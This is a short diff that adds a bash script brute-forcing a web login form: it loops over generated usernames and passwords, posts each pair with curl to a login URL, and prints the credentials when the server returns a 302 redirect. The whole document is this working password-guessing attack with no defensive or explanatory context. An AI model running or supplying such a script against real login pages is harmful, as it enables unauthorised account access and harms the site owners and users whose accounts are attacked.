@@ -1,0 +1,10 @@
+url="http://foo.dev/login"
+for user in $(userlist_gen); do
+  for pass in $(passlist_gen); do
+    http_code=$(curl -L --data-urlencode  user="$user" --data-urlencode password="$pass" "$url" -w '%{http_code}' -o /dev/null -s)
+    if [[ $http_code -eq 302 ]]; then
+      echo "Success: User: '$user' Pass: '$pass'"
+      break 2
+    fi
+  done
+done
